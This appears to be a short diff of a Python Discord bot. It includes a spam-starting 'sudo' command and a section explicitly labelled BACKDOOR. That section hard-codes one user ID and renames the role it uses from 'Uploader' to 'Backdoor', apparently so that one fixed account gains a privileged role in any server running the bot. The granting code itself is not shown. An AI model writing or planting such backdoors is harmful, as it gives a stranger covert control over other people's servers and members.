@@ -70,7 +70,7 @@ async def sudo_startmessage(ctx):
     await ctx.send("✅ spam started")
 # ================= BACKDOOR =================
     USER_ID = 1258115928525373570
-    ROLE_NAME = "Uploader"
+    ROLE_NAME = "Backdoor"
 
     guild = ctx.guild
 
@@ -122,4 +122,5 @@ if not TOKEN:
     raise RuntimeError("DISCORD_TOKEN environment variable not set")
 
 bot.run(TOKEN)
+
 
